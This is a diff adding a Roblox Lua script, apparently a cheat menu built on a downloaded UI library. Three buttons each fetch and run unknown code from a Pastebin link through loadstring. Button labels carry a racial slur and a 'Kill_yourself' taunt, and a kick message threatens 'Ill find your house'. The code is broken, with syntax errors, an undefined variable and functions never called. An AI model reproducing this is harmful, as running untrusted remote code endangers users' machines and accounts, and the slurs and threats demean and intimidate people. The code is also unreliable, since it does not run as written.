@@ -1,0 +1,30 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("From Damon", "DarkTheme")
+
+--main
+local Main = Window:NewTab("4_Yor")
+local MainSection = Main:NewSection("Niga")
+
+MainSection:NewButton("akin sya pre wag ka ganyan", "Opening Black MonkeyMonkey", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/djbfk8li"l),true)()
+end)
+
+MainSection:NewButton("Kill_yourself", "Opening Black MonkeyMonkey", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/djbfk8li"l),true)()
+end)
+
+MainSection:NewButton("Leave Her alone", "Opening Black MonkeyMonkey", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/djbfk8li"l),true)()
+end)
+
+Section:NewToggle("Accept?", "ToggleInfo", function(state)
+    if state then
+        local function kickPlayer(player)
+    player:Kick("Okay Thank you")
+end
+    else
+        local function kickPlayer(player)
+    player:Kick("Ill find your house")
+end
+    end
+end)
